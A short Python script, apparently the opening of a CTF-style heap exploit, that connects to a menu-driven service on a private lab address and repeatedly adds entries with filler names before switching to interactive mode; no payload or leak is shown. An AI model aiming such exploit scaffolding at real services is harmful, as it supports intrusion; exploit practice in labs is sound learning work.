from PwnIOI import *
import time
s = IOI(['192.168.0.85',1234])
raw_input()
def new(name,rating,film):
  s.write('1\n')
  time.sleep(2)
  s.write(name)
  s.write(str(rating)+'\n')
  s.write(str(film)+'\n')
for i in range(9):
  new('A'*0x10+'\n',1,0)
s.interact()
